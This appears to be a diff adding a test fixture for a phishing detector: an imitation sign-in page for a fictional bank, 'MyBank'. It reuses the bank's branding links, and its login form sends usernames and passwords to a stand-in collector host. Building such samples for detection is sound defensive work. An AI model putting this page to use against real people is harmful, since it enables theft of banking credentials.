@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<!-- Simulated clone of the fictional MyBank page, for testing the detector.
+     The form points to a non-existent example domain; nothing is collected. -->
+<html lang="en">
+<head>
+  <title>MyBank Online Banking | Sign in</title>
+  <link rel="stylesheet" href="https://www.mybank.co.za/static/css/mybank-main.css">
+</head>
+<body>
+  <header><img src="https://www.mybank.co.za/static/img/mybank-logo.svg" alt="MyBank"></header>
+  <main>
+    <h1>Sign in to Online Banking</h1>
+    <p>Welcome back. Enter your username and password to access your accounts.</p>
+    <form action="https://collector.example.invalid/next.php" method="post">
+      <label for="username">Username</label>
+      <input id="username" name="username" type="text">
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password">
+      <button type="submit">Sign in</button>
+    </form>
+    <p>Never share your one-time PIN with anyone. MyBank will never ask for it by phone or email.</p>
+  </main>
+  <footer>MyBank Ltd is an authorised financial services provider.</footer>
+</body>
+</html>
